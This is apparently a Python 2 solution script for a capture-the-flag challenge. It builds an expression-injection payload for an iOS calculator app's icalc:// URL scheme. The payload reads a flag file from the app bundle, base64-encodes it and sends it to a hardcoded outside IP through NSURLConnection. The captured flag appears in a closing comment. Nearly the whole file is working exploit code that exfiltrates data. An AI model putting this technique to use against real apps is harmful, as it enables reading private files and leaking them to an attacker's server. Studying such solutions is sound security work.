import urllib

host = 'http://149.28.204.92'
flag = '/flag'

def Class(name):
    return 'CAST("%s", "Class")' % name

def Call(obj, func, *args):
    ext = ', ' + ', '.join(map(str, args)) if len(args) > 0 else ''
    return 'FUNCTION(%s, %s%s)' % (obj, func, ext)

mainBundle = Call(Call(Class("NSBundle"), '"mainBundle"'), '"bundlePath"')
print mainBundle

flagPath = Call(Class("NSString"), '"pathWithComponents:"', '{%s, "%s"}' %
        (mainBundle, flag))
print flagPath

flag = Call(Class("NSData"), '"dataWithContentsOfFile:"', flagPath)
print flag

url = Call(Class("NSString"), '"pathWithComponents:"', '{"%s", %s}' %
        (host, Call(flag, '"base64EncodedStringWithOptions:"', 0)))
print url

url = Call(Class("NSURL"), '"URLWithString:"', url)
print url

req = Call(Class("NSURLRequest"), '"requestWithURL:"', url)
print req

conn = Call(Class("NSURLConnection"), '"connectionWithRequest:delegate:"', req,
        Class("NSURLConnection"))
print conn

print 'icalc://' + urllib.quote(conn.replace(' ', '')).replace('/', '%2f')

# rwctf{alldayidreamaboutprejailbrokeniphone}\n
